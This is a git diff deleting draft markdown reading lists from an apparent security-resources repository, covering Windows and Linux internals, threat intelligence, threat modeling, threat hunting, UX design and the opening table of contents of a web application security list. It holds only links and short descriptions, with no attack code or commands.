-##### System Features
-System Features
-* [Windows - Application Shims](https://technet.microsoft.com/en-us/library/dd837644%28v=ws.10%29.aspx)
-* [Application Compatibility in Windows](https://technet.microsoft.com/en-us/windows/jj863248)
-* [Windows - Application Shims](https://technet.microsoft.com/en-us/library/dd837644%28v=ws.10%29.aspx)
-* [LSA Authentication](https://msdn.microsoft.com/en-us/library/windows/desktop/aa378326%28v=vs.85%29.aspx)
-	* LSA Authentication describes the parts of the Local Security Authority (LSA) that applications can use to authenticate and log users on to the local system. It also describes how to create and call authentication packages and security packages.
-* [Hard Links and Junctions - msdn](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365006(v=vs.85).aspx)
-* [Security Configuration Wizard](https://technet.microsoft.com/en-us/library/cc754997(v=ws.11).aspx)
-	* The Security Configuration Wizard (SCW) guides you through the process of creating, editing, applying, or rolling back a security policy. A security policy that you create with SCW is an .xml file that, when applied, configures services, network security, specific registry values, and audit policy. SCW is a role-based tool: you can use it to create a policy that enables services, firewall rules, and settings that are required for a selected server to perform specific roles, such as a file server, a print server, or a domain controller.
-
-
-Named Pipes
-* [Named Pipes](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365590(v=vs.85).aspx)
-* [CreateNamedPipe function](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365150(v=vs.85).aspx)
-* [CreateFile function](https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx)
-* ReadFile function](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365467(v=vs.85).aspx)
-* [WriteFile function](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx)
-* [How to create an anonymous pipe that gives access to everyone](https://support.microsoft.com/en-us/help/813414/how-to-create-an-anonymous-pipe-that-gives-access-to-everyone)
-
-Windows Communication Foundation
-* [What Is Windows Communication Foundation](https://docs.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf)
-	* Windows Communication Foundation (WCF) is a framework for building service-oriented applications. Using WCF, you can send data as asynchronous messages from one service endpoint to another. A service endpoint can be part of a continuously available service hosted by IIS, or it can be a service hosted in an application. An endpoint can be a client of a service that requests data from a service endpoint. The messages can be as simple as a single character or word sent as XML, or as complex as a stream of binary data.
-* [Fundamental Windows Communication Foundation Concepts](https://docs.microsoft.com/en-us/dotnet/framework/wcf/fundamental-concepts)
-	*  WCF is a runtime and a set of APIs for creating systems that send messages between services and clients. The same infrastructure and APIs are used to create applications that communicate with other applications on the same computer system or on a system that resides in another company and is accessed over the Internet.
-* [Windows Communication Foundation Architecture Architecture Graphic](https://docs.microsoft.com/en-us/dotnet/framework/wcf/architecture)
-
-
----------------------
-#### Writeups
-Writeups
-* AutoStart Locations
-	* [Collection of Windows Autostart locations](http://gladiator-antivirus.com/forum/index.php?showtopic=24610)
-	* [Windows Program Automatic Startup Locations](http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/)
-* Exploit Prevention/Mitigation/Hardening
-	* [Preventing the Exploitation of Structured Exception Handler (SEH) Overwrites with SEHOP](https://blogs.technet.microsoft.com/srd/2009/02/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/)
-	* [Windows 8 ASLR Explained](http://blog.ptsecurity.com/2012/12/windows-8-aslr-internals.html)
-	* [Introduction to Windows Kernel Security](http://blog.cmpxchg8b.com/2013/05/introduction-to-windows-kernel-security.html)
-	* [How Control Flow Guard Drastically Caused Windows 8.1 Address Space and Behavior Changes](http://www.alex-ionescu.com/?p=246)
-	* [Technical Overview of Windows UEFI Startup Process](http://news.saferbytes.it/analisi/2013/10/windows-uefi-startup-a-technical-overview/)
-	* [Detecting stealthier cross-process injection techniques with Windows Defender ATP: Process hollowing and atom bombing](https://blogs.technet.microsoft.com/mmpc/2017/07/12/detecting-stealthier-cross-process-injection-techniques-with-windows-defender-atp-process-hollowing-and-atom-bombing/)
-* File Structure
-	* [PEB Structure 32/64 pdf](http://blog.rewolf.pl/blog/wp-content/uploads/2013/03/PEB_Evolution.pdf)
-* General
-	* [Intercepting System Calls on x86_64 Windows](http://jbremer.org/intercepting-system-calls-on-x86_64-windows/)
-	* [Windows Filtering Platform: Persistent state under the hood](http://blog.quarkslab.com/windows-filtering-platform-persistent-state-under-the-hood.html)
-* Kernel
-	* [Inside the Windows Vista Kernel: Part 1](http://technet.microsoft.com/en-us/magazine/2007.02.vistakernel.aspx)
-* Processes
-	* [Know your Windows Processes or Die Trying](https://sysforensics.org/2014/01/know-your-windows-processes.html)
-	* Excellent quick reference on Windows proccesses with a focus on Win7. Good resource.
-	* [Unkillable Processes](https://blogs.technet.microsoft.com/markrussinovich/2005/08/17/unkillable-processes/)
-* Sandboxing
-	* [Advanced Desktop Application Sandboxing via AppContainer](https://www.malwaretech.com/2015/09/advanced-desktop-application-sandboxing.html)
-	* [Usermode Sandboxing](http://www.malwaretech.com/2014/10/usermode-sandboxing.html)
-* Windows
-	* [Hyper-V internals](https://hvinternals.blogspot.fr/2015/10/hyper-v-internals.html)
-	* [Hyper-V debugging for beginner](https://hvinternals.blogspot.fr/2015/10/hyper-v-debugging-for-beginners.html)
-	* [Windows Operating System Archaeology](https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology)
-	* [Understanding Windows at a deeper level - Sessions, Window Stations, and Desktops](https://brianbondy.com/blog/100/understanding-windows-at-a-deeper-level-sessions-window-stations-and-desktops)
-	* [Introduction to ADS: Alternate Data Streams](https://hshrzd.wordpress.com/2016/03/19/introduction-to-ads-alternate-data-streams/)
-	* [Creative and unusual things that can be done with the Windows API.](https://github.com/LazoCoder/Windows-Hacks)
-
-
-
-
-
----------------------
-#### Presentations & Talks
-* [Windows 8 Security and ARM](http://2012.ruxconbreakpoint.com/assets/Uploads/bpx/alex-breakpoint2012.pdf)
-* [How Do Windows NT System Calls REALLY Work?](http://www.codeguru.com/cpp/w-p/system/devicedriverdevelopment/article.php/c8035/How-Do-Windows-NT-System-Calls-REALLY-Work.htm)
-* [WinPrefetchView v1.25](http://www.nirsoft.net/utils/win_prefetch_view.html)
-	* Each time that you run an application in your system, a Prefetch file which contains information about the files loaded by the application is created by Windows operating system. The information in the Prefetch file is used for optimizing the loading time of the application in the next time that you run it. 
-WinPrefetchView is a small utility that reads the Prefetch files stored in your system and display the information stored in them. By looking in these files, you can learn which files every application is using, and which files are loaded on Windows boot. 
-* [Windows 8 Security and ARM](http://2012.ruxconbreakpoint.com/assets/Uploads/bpx/alex-breakpoint2012.pdf)
-* [License to Kill: Malware Hunting with the Sysinternals Tools](http://channel9.msdn.com/Events/TechEd/NorthAmerica/2013/ATC-B308)
-* [Utilizing SysInternal Tools for IT Pros](http://www.microsoftvirtualacademy.com/training-courses/utilizing-sysinternals-tools-for-it-pros#fbid=1IKsqgyvnWp)
-
-
----------------------
-### Active Directory
-* [Active Directory Architecture](https://technet.microsoft.com/en-us/library/bb727030.aspx)
-* [AD Local Domain groups, Global groups and Universal groups.](https://ss64.com/nt/syntax-groups.html)
-* [Active Directory Control Paths](https://github.com/ANSSI-FR/AD-control-paths)
-	*  Active Directory Control Paths auditing and graphing tools 
-
-
-
-
----------------------
-#### <a name="kerberos">Kerberos Related</a>
-* [Kerberos Delegation, SPNs and More...](https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more)
-* [Article Explaining what the KRBTGT account in AD is](http://windowsitpro.com/security/q-what-krbtgt-account-used-active-directory-ad-environment)
-
-
-
-
----------------------
-### <a name="linux">Linux General</a>
-* [Introduction to Linux - Machtelt Garrels](http://www.tldp.org/LDP/intro-linux/html/intro-linux.html)
-	* Excellent doc covering every aspect of linux. Deserves at least 1 skim through.
-* [Linux Documentation Project](http://www.tldp.org/)
-	* The Linux Documentation Project is working towards developing free, high quality documentation for the Linux operating system. The overall goal of the LDP is to collaborate in all of the issues of Linux documentation.
-* [Bash Guide for Beginners](http://www.tldp.org/LDP/Bash-Beginners-Guide/html/Bash-Beginners-Guide.html)
-* [pagexec - GRSEC](https://pax.grsecurity.net/docs/pageexec.txt)
-
-
----------------------
-### <a name="linux">Linux Internals</a>
-* [linux-insides](https://www.gitbook.com/book/0xax/linux-insides/details)
-	* A series of posts about the linux kernel. The goal is simple - to share my modest knowledge about the internals of the linux kernel and help people who are interested in the linux kernel, and other low-level subject matter.
-* [Introduction to Linux - Machtelt Garrels](http://www.tldp.org/LDP/intro-linux/html/intro-linux.html)
-	* Excellent doc covering every aspect of linux. Deserves at least 1 skim through.
-* [Linux Kernel Security Subsystem Wiki](https://kernsec.org/wiki/index.php/Main_Page)
-	* This is the Linux kernel security subsystem wiki, a resource for developers and users. 
-
-
----------------------
-#### Compilers/Exploit Mitigations
-* [Linkers and Loaders - Book](http://www.iecc.com/linker/)
-	* These are the manuscript chapters for my Linkers and Loaders, published by Morgan-Kaufman. See the book's web site for ordering information. 
-	* All chapters are online for free at the above site.
-* [Linker and Libraries](http://docs.oracle.com/cd/E19457-01/801-6737/801-6737.pdf)
-
-
-
----------------------
-#### Drivers
-* [Linux Device Drivers book](http://www.makelinux.net/ldd3/)
-
-
----------------------
-#### FileSystems
-
-* Linux Filesystem infographic
-* [Part 1](http://i.imgur.com/EU6ga.jpg)
-* [Part 2](http://i.imgur.com/S5Ds2.jpg)
-
-
----------------------
-#### Kernel
-* [Linux Kernel Explanation/Walk through](http://www.faqs.org/docs/Linux-HOWTO/KernelAnalysis-HOWTO.html)
-* [Kernel booting process](https://github.com/0xAX/linux-insides/tree/master/Booting)
-	* This chapter describes linux kernel booting process.
-* [How the Kernel manages Memory - Linux](http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory/)
-
-
-
-
-
-
-
-
----------------------
-#### Memory
-* [Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
-* [Memory Management: Paging](https://www.cs.rutgers.edu/~pxk/416/notes/09a-paging.html)
-* [Anatomy of a program in memory](http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/) 
-	* Writeup on the structure of program memory in Linux.
-* [Understanding !PTE - Non-PAE and X64](http://blogs.msdn.com/b/ntdebugging/archive/2010/06/22/part-3-understanding-pte-non-pae-and-x64.aspx?Redirected=true)
-* [Linux GLibC Stack Canary Values](https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/)
-* [Stack Smashing Protector](http://wiki.osdev.org/Stack_Smashing_Protector)
-* [Memory Translation and Segmentation](http://duartes.org/gustavo/blog/post/memory-translation-and-segmentation/)
-
-
-
----------------------
-#### Process Structure/Syscalls
-* [FlexSC: Flexible System Call Scheduling with Exception-Less System Calls](https://www.cs.cmu.edu/~chensm/Big_Data_reading_group/papers/flexsc-osdi10.pdf)
-* [List of Linux/i386 system calls](http://asm.sourceforge.net/syscall.html)
-* [Linux Syscall Table](http://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html)
-	* Complete listing of all Linux Syscalls
-
-
-
----------------------
-#### ELF
-* [The 101 of ELF Binaries on Linux: Understanding and Analysis](https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/)
-* [Understanding the ELF](https://medium.com/@MrJamesFisher/understanding-the-elf-4bd60daac571)
-* [ELF Format](http://www.skyfree.org/linux/references/ELF_Format.pdf)
-
-
----------------------
-#### X 
-* [X Window System Explained](https://magcius.github.io/xplain/article/index.html)
-* [Foreign LINUX](https://github.com/wishstudio/flinux)
-	* Foreign LINUX is a dynamic binary translator and a Linux system call interface emulator for the Windows platform. It is capable of running unmodified Linux binaries on Windows without any drivers or modifications to the system. This provides another way of running Linux applications under Windows in constrast to Cygwin and other tools.
-
-
----------------------
-### <a name="ARM">ARM References</a>
-* [A Detailed Analysis of Contemporary ARM and x86 Architectures](http://research.cs.wisc.edu/vertical/papers/2013/isa-power-struggles-tr.pdf)
-	* RISC vs. CISC wars raged in the 1980s when chip area andprocessor design complexity were the primary constraints anddesktops and servers exclusively dominated the computing land-scape. Today, energy and power are the primary design con-straints and the computing landscape is significantly different:growth in tablets and smartphones running ARM (a RISC ISA)is surpassing that of desktops and laptops running x86 (a CISCISA). Further, the traditionally low-power ARM ISA is enter-ing the high-performance server market, while the traditionallyhigh-performance x86 ISA is entering the mobile low-power de-vice market. Thus, the question of whether ISA plays an intrinsicrole in performance or energy efficiency is becoming important,and we seek to answer this question through a detailed mea-surement based study on real hardware running real applica-tions. We analyze measurements on the ARM Cortex-A8 andCortex-A9 and Intel Atom and Sandybridge i7 microprocessorsover workloads spanning mobile, desktop, and server comput-ing. Our methodical investigation demonstrates the role of ISAin modern microprocessors’ performance and energy efficiency.We find that ARM and x86 processors are simply engineeringdesign points optimized for different levels of performance, andthere is nothing fundamentally more energy efficient in one ISAclass or the other. The ISA being RISC or CISC seems irrelevant.
-* [ARM Documentation](http://infocenter.arm.com/help/index.jsp?noscript=1)
-
----------------------
-### <a name="osx">OS X Internals</a>
-* [Instruments - OS X system analysis](https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/InstrumentsUserGuide/Introduction/Introduction.html)
-	* Instruments is a performance-analysis and testing tool for dynamically tracing and profiling OS X and iOS code. It is a flexible and powerful tool that lets you track a process, collect data, and examine the collected data. In this way, Instruments helps you understand the behavior of both user apps and the operating system.
-
-
-
----------------------
-### Other 
-* [Intel SGX Explained](https://eprint.iacr.org/2016/086.pdf)
-	* This paper analyzes Intel SGX, based on the 3 pa- pers [ 14 , 78 , 137 ] that introduced it, on the Intel Software Developer’s Manual [ 100 ] (which supersedes the SGX manuals [ 94 , 98 ]), on an ISCA 2015 tutorial [ 102 ], and on two patents [ 108 , 136 ]. We use the papers, reference manuals, and tutorial as primary data sources, and only draw on the patents to fill in missing information. This  paper’s  contributions  are  a  summary  of  the Intel-specific architectural and micro-architectural details needed to understand SGX, a detailed and structured pre- sentation of the publicly available information on SGX, a series of intelligent guesses about some important but undocumented aspects of SGX, and an analysis of SGX’s security properties.
\ No newline at end of file
diff --git a/Draft/Threat Intelligence.md b/Draft/Threat Intelligence.md
deleted file mode 100755
index a06b630..0000000
--- a/Draft/Threat Intelligence.md	
+++ /dev/null
@@ -1,26 +0,0 @@
-#Threat Intelligence(or lack therof?)
-
-[No Budget Threat Intelligence - Tracking Malware Campaigns on the Cheap - ShmooCon15](https://www.youtube.com/watch?v=DKfWukYffsE&app=desktop)
-* "In this talk, I'll be discussing my experience developing intelligence-gathering capabilities to track several different independent groups of threat actors on a very limited budget (read: virtually no budget whatsoever). I'll discuss discovering the groups using open source intelligence gathering and honeypots, monitoring attacks, collecting and analyzing malware artifacts to figure out what their capabilities are, and reverse engineering their malware to dehttp://faydoc.tripod.com/cpu/index_a.htmvelop the capability to track their targets in real time. Finally, I'll chat about defensive strategies and provide recommendations for enterprise security analysts and other security researchers. I'll also be releasing a suite of tools I created to help threat researchers perform tracking and attribution.
-
-
-
-
-
-
-
-
-
-[Malware Information Sharing Platform](https://github.com/MISP/MISP)
-* MISP - Malware Information Sharing Platform & Threat Sharing 
-
-[Collective Intelligence Framework](http://csirtgadgets.org/collective-intelligence-framework/)
-* "Our Flagship Project, is a cyber threat intelligence management system. CIF allows you to combine known malicious threat information from many sources and use that information for identification (incident response), detection (IDS) and mitigation (null route). The most common types of threat intelligence warehoused in CIF are IP addresses, domains and urls that are observed to be related to malicious activity."
-
-[Collaborative Research Into Threats](https://crits.github.io/)
-* CRITs is an open source malware and threat repository that leverages other open source software to create a unified tool for analysts and security experts engaged in threat defense. It has been in development since 2010 with one goal in mind: give the security community a flexible and open platform for analyzing and collaborating on threat data. In making CRITs free and open source, we can provide organizations around the world with the capability to quickly adapt to an ever-changing threat landscape. CRITs can be installed locally for a private isolated instance or shared among other trusted organizations as a collaborative defense mechanism.
-
-
-
-
-
diff --git a/Draft/Threat Modeling.md b/Draft/Threat Modeling.md
deleted file mode 100755
index b4c1702..0000000
--- a/Draft/Threat Modeling.md	
+++ /dev/null
@@ -1,100 +0,0 @@
-## Threat Modeling
-
-### TOC
-* Talks & Presentations
-* Threat Modeling Methodologies
-* Writeups & Articles
-* Tools
-* Papers
-
-
-
-
-
-[Global Adversarial Capability Modeling](https://www.youtube.com/watch?v=56T3JN09SrY#t=41)
-
-
-[ThreatHuntingStuff](https://github.com/MatthewDemaske/ThreatHuntingStuff)
-
-[Adam Shostack - Pentesting: Lessons from Star Wars](https://www.youtube.com/watch?v=BfWWryF8M7E&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=13)
-* Everyone knows you ought to threat model, but in practical reality it turns out to be tricky. If past efforts to threat model haven’t panned out, perhaps part of the problem is confusion over what works, and how the various approaches conflict or align. This talk captures lessons from years of work helping people throughout the software industry threat model more effectively. It’s designed to help security pros, especially pen testers, all of whom will leave with both threat modeling lessons from Star Wars and a proven foundation, enabling them to threat model effectively on offense or defense.
-
-
-
-
-
-### Talks & Presenetations
-
-[A Hacker's Guide to Risk](https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEFCON-23-Bruce-Potter-Hackers-Guide-to-Risk.pdf)
-
-[Global Adversarial Capability Modeling](https://www.youtube.com/watch?v=56T3JN09SrY#t=41)
-
-
-
-### Threat Modeling Methodologies
-
-[Guerrilla Threat Modelling (or 'Threat Modeling' if you're American)](http://blogs.msdn.com/b/ptorr/archive/2005/02/22/guerillathreatmodelling.aspx)
-
-
-
-### Writeups/Articles
-
-[Why your threat model is probably wrong - Cyberwar](http://blog.thinkst.com/p/cyberwar-why-your-threat-model-is.html)
-
-[7 Steps to Threat Modeling](https://www.slideshare.net/chinwhei/7-steps-to-threat-modeling)
-
-
-
-
-
-### Tools
-
-[seasponge - Mozilla Project](https://github.com/mozilla/seasponge)
-* Accessible and client-side threat modeling tool
-* [GIFs demonstrating usage](https://github.com/mozilla/seasponge/wiki/usage)[On Comparing Threat Intelligence Feeds](http://blogs.gartner.com/anton-chuvakin/2014/01/07/on-comparing-threat-intelligence-feeds/)
-
-[ThreadFix](https://github.com/denimgroup/threadfix)
-* ThreadFix is a software vulnerability aggregation and management system that helps organizations aggregate vulnerability data, generate virtual patches, and interact with software defect tracking systems.
-
-[ThreadFix](https://github.com/denimgroup/threadfix)
-* ThreadFix is a software vulnerability aggregation and management system that helps organizations aggregate vulnerability data, generate virtual patches, and interact with software defect tracking systems.
-
-
-
-
-
-### Papers
-
-[Statement for the Record  Worldwide Threat Assessment  of the  US Intelligence Community  Senate Select Committee on Intelligence](https://www.dni.gov/files/documents/Newsroom/Testimonies/SSCI%20Unclassified%20SFR%20-%20Final.pdf)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
diff --git a/Draft/Threat-Hunting.md b/Draft/Threat-Hunting.md
deleted file mode 100644
index b1a5795..0000000
--- a/Draft/Threat-Hunting.md
+++ /dev/null
@@ -1,58 +0,0 @@
-# Threat Hunting
-
-### ToC
-
-
-
-
-#### Sort
-
-
-#### End Sort
-
-
-### General
-
-
-
-### Articles/Blogposts
-
-
-[Windows Log Hunting with PowerShell](http://909research.com/windows-log-hunting-with-powershell/)
-
-[Hunting in Memory](https://www.endgame.com/blog/technical-blog/hunting-memory)
-https://niccs.us-cert.gov/workforce-development/cyber-security-workforce-framework
-
-[Windows Log Hunting with PowerShell](http://909research.com/windows-log-hunting-with-powershell/)
-
-
-### Talks/Videos
-
-[Taking Hunting to the Next Level Hunting in Memory - Jared Atkinson 2017](https://www.youtube.com/watch?v=3RUMShnJq_I)
-
-
-
-
-
-### Tools
-
-[Revoke-Obfuscation](https://github.com/danielbohannon/Revoke-Obfuscation)
-* Revoke-Obfuscation is a PowerShell v3.0+ compatible PowerShell obfuscation detection framework.
-
-
-
-### Papers
-
-[Revoke -­- Obfuscation: PowerShell Obfuscation Detection Using Science](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf)
-
-
-
-
-
-
-
-
-
-
-
-
diff --git a/Draft/UX Design - Because we all know how sexy pgp is.md b/Draft/UX Design - Because we all know how sexy pgp is.md
deleted file mode 100755
index ca99fc2..0000000
--- a/Draft/UX Design - Because we all know how sexy pgp is.md	
+++ /dev/null
@@ -1,52 +0,0 @@
-# UX/UI Design - Because we all know how sexy PGP looks / How easy to use it is.
-
-
-
-#### ToC
-* [General](#general)
-* [Books](#books)
-* [Talks/Presentations](#talks)
-* [Websites/Organizations](#web)
-
-
-
-
-#### Sort
-[The unexpected dangers of preg_replace()](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace)
-
-https://dribbble.com/
-
-https://www.uplabs.com/
-
-[CodePen](https://codepen.io/#)
-
-
-#### End Sort
- 
-
-### <a name="general"></a>General
-General
-Required Reading: [The Design of Everyday Things](http://www.jnd.org/books/design-of-everyday-things-revised.html)
-	* This book is extraordinary not only in the fact that its a crash course on UI/UX design but also for the fact that almost anyone can read it and understand the principles it talks about.
-* [User Interface - Wikipedia](https://en.wikipedia.org/wiki/User_interface)
-* [User Interface Design - Wikipedia](https://en.wikipedia.org/wiki/User_interface_design)
-* [UI Patterns](http://ui-patterns.com/)
-* [Principals of User Interface Design](https://en.wikipedia.org/wiki/Principles_of_user_interface_design)
-* [User Interface Design Basics - usability.gov](https://www.usability.gov/what-and-why/user-interface-design.html)
-
-
-* Books
-	* The Design of Everyday Things
-	* Emotional Design
-	* Don't Make me think
-* Talks & Presentations
-	* [UI Fundamentals for Programmers by Ryan Singer](https://vimeo.com/6702766)
-* Articles
-	* [The Complete Moral Bankruptcy of Manipulating Human Psychology To Turn Users Into Addicts](https://hackernoon.com/the-complete-moral-bankruptcy-of-manipulating-human-psychology-to-turn-users-into-addicts-d09b98281ef)
-
-* Websites/Organizations
-[Dark Patterns: fighting user deception worldwide](http://darkpatterns.org/)
-	* A Dark Pattern is a user interface that has been carefully crafted to trick users into doing things, such as buying insurance with their purchase or signing up for recurring bills.
-[Nielsen Norman Group](http://www.nngroup.com)
-	* Evidence-Based User Experience Research, Training, and Consulting
-	* check articles and guidelines, ignore other sections
\ No newline at end of file
diff --git a/Draft/Web & Browsers.md b/Draft/Web & Browsers.md
deleted file mode 100755
index 8e1044e..0000000
--- a/Draft/Web & Browsers.md	
+++ /dev/null
@@ -1,1285 +0,0 @@
-
-
-# Web, Web Applications & Browsers
-
-Web TOC
-* General](#general)
-* [Purposely Vulnerable Web Apps](#pvuln)
-* [Securing Web Applications Checklists](#checklist)
-* [Talks & Presentations](#talks)
-* [General Tools](#generalt)
-* [Different Typs of Web Based Attacks](#difatk)
-	* [Abuse of Functionality](#abuse)
-	* [Brute Force Fuzzing](#brute)
-	* [Attacking Continous Integration Systems](#ci)
-	* [Cross-Site-Request Forgery](#csrf)
-	* [De/Encoders](#encode)
-	* [Data Structure Attacks](#dsa)
-	* [Embedded Malicious Code](#emc)
-	* [Exploitation of Authentication](#eoa) 
-	* [Injection Based Attacks](#ija)
-		* OS Command Injection 
-		* (NO)SQL Injection
-	* [JNDI](#jndi)
-	* [Java Serialization Attacks](#jsa) 
-	* [JSON Web Tokens](#jwt)
-	* [LFI & RFI](#lrfi)
-	* [Path Traversal Attacks](#pta)
-	* [Server Side Request Forgery](#ssrf)
-	* [Server Side Include](#ssi)
-	* [Server Side Template Injection](#ssti)
-	* [Timing Attacks](#timing)
-	* [Web Shells](#shells)
-	* [XSS](#xss)
-* [API Stuff](#api)
-* [Attacking Browsers](#atkb)
-* [CMS Specific Tools](#cms)
-* [HTML5](#html5)
-* [Javascript](#javascript)
-* [REST & Web Services](#rest)
-* [PHP](#php)
-* [Ruby](#ruby)
-* [Scraping](#scraping)
-* [Site/WebApp Scanners](#scanners)
-* [Web Sockets](#websocket)
-* [Web Proxies](#webproxy)
-* [Web Application Firewalls(WAFs)](#waf)
-	* [Bypassing WAFs](#bwaf)
-* [Web Application Attack Writeups](#writeups)
-* [Non-Attack Writeups](#nonwriteup)
-* [Papers](#papers)
-* [Miscellaneous](#misc)
-* [Burp Stuff/Plugins](#burp)
-* [AWS stuff](#aws)
-* [Google Compute Cloud/AppEngine](#gcc)
-
-
-
-
-#### Sort
-* Fix ToC
-* Add CSP
-	* [Intro to content Security Policy](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)
-* Add SOAP
-* Clickjack(ing)
-* [Postcards from a Post-XSS World - Michael Zalewski](http://lcamtuf.coredump.cx/postxss/#dangling-markup-injection)
-	* This page is a rough collection of notes on some of the fundamental alternatives to direct script injection that would be available to attackers following the universal deployment of CSP or other security mechanisms designed to prevent the execution of unauthorized scripts. I hope to demonstrate that in many cases, the capabilities offered by these alternative methods are highly compatible with the goals of contemporary XSS attacks.
-
-http://console-cowboys.blogspot.com/2011/05/web-hacking-video-series-1-automating.html 
-
-https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/
-#### End Sort
-
-
-
-----------------
-### <a name="general">General</a>
-General
-* 101
-* Cheat Sheets
-	* [Attack Surface Analysis Cheat Sheet](https://www.owasp.org/index.php/Attack_Surface_Analysis_Cheat_Sheet)
-* Documentation
-	* [DOM - Standard](https://dom.spec.whatwg.org/)
-	* [DOM Living Standard](https://dom.spec.whatwg.org/)
-	* [HTML 5 Standards](http://w3c.github.io/html/)
-	* [Transport Layer Security (TLS) Extensions](https://www.iana.org/assignments/tls-extensiontype-values/tls-extensiontype-values.xhtml)
-	* [Web IDL Standards](https://heycam.github.io/webidl/)
-	* [Object MetaInformation](https://www.w3.org/Protocols/HTTP/Object_Headers.html#public)
-* Educational
-	* [The Tale of a Fameless but Widespread Web Vulnerability Class - Veit Hailperin](https://www.youtube.com/watch?v=5qA0CtS6cZ4)
-		* Two keys components account for finding vulnerabilities of a certain class: awareness of the vulnerability and ease of finding the vulnerability. Cross-Site Script Inclusion (XSSI) vulnerabilities are not mentioned in the de facto standard for public attention - the OWASP Top 10. Additionally there is no public tool available to facilitate finding XSSI. The impact reaches from leaking personal information stored, circumvention of token-based protection to complete compromise of accounts. XSSI vulnerabilities are fairly wide spread and the lack of detection increases the risk of each XSSI. In this talk we are going to demonstrate how to find XSSI, exploit XSSI and also how to protect against XSSI.
-	* [Discover DevTools](https://www.codeschool.com/courses/discover-devtools)
-		* Learn how Chrome DevTools can sharpen your dev process and discover the tools that can optimize your workflow and make life easier.
-* General
-	* [OWASP Top Ten Project](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)
-		* The OWASP Top 10 is a powerful awareness document for web application security. It represents a broad consensus about the most critical security risks to web applications. Project members include a variety of security experts from around the world who have shared their expertise to produce this list. 
-	* [JSFuck](http://www.jsfuck.com/)
-		* JSFuck is an esoteric and educational programming style based on the atomic parts of JavaScript. It uses only six different characters to write and execute code.
-	* [How to Obscure Any URL](http://www.pc-help.org/obscure.htm)
-	* [HTTP Evasion](http://noxxi.de/research/http-evader-explained-8-borderline-robustness.html)	
-	* [Big List of Naughty Strings](https://github.com/minimaxir/big-list-of-naughty-strings)
-		* The Big List of Naughty Strings is an evolving list of strings which have a high probability of causing issues when used as user-input data. This is intended for use in helping both automated and manual QA testing; useful for whenever your QA engineer walks into a bar.
-* Interesting Attacks that don't fit elsewhere
-	* [Abusing Certificate Transparency Or How To Hack Web Applications BEfore Installation - Hanno Bock](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-Hanno-Boeck-Abusing-Certificate-Transparency-Logs.pdf)
-
-
-------------------
-### <a name="pvuln"></a>Purposely Vulnerable Web Applications/Testing Grounds
-Purposely Vulnerable Web Apps/VMs
-* [OWASP Vulnerable Web Applications Directory Project/Pages/Offline](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project/Pages/Offline)
-* [OWASP Juice Shop](https://github.com/bkimminich/juice-shop)
-	* OWASP Juice Shop is an intentionally insecure web application written entirely in Javascript which encompasses the entire range of OWASP Top Ten and other severe security flaws.
-* [Pwning OWASP Juice Shop](https://leanpub.com/juice-shop)
-* [Hackazon](https://github.com/rapid7/hackazon)
-	* Hackazon is a free, vulnerable test site that is an online storefront built with the same technologies used in today’s rich client and mobile applications. Hackazon has an AJAX interface, strict workflows and RESTful API’s used by a companion mobile app providing uniquely-effective training and testing ground for IT security professionals. And, it’s full of your favorite vulnerabilities like SQL Injection, cross-site scripting and so on.
-
-
-
-
-
-----------------
-### <a name="checklist">Securing Web Applications/Checklists</a>
-Checklists
-* Attacking
-	* [OWASP Testing Checklist](https://www.owasp.org/index.php/Testing_Checklist)
-	* [WebAppSec Testing Checklist](http://tuppad.com/blog/wp-content/uploads/2012/03/WebApp_Sec_Testing_Checklist.pdf)
-	* [OWASP Web Application Security Testing Cheat Sheet](https://www.owasp.org/index.php/Web_Application_Security_Testing_Cheat_Sheet)
-
-* Securing
-	* [Center for Internet Security Apache Server 2.4 Hardening Guide](https://benchmarks.cisecurity.org/tools2/apache/CIS_Apache_HTTP_Server_2.4_Benchmark_v1.1.0.pdf)
-	* [Securing Web Application Technologies Checklist](http://www.securingthehuman.org/developer/swat)
-	* [Wordpress Security Guide - WPBeginner](http://www.wpbeginner.com/wordpress-security/)
-	* [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist/blob/master/README.md)
-
-	* [Magical Code Injection Rainbow Framework](https://github.com/SpiderLabs/MCIR)
-		* The Magical Code Injection Rainbow! MCIR is a framework for building configurable vulnerability testbeds. MCIR is also a collection of configurable vulnerability testbeds. Has testing lessons for xss/csrf/sql
-
-
-
-
-
-----------------
-### <a name="talks"></a>Talks &  Presentations
-Talks & Presentations
-* [The Website Obesity Crisis](http://idlewords.com/talks/website_obesity.htm)
-* [Attacking Modern SaaS Companies](https://github.com/cxxr/talks/blob/master/2017/nolacon/Attacking%20Modern%20SaaS%20Companies%20%E2%80%93%20NolaCon.pdf)
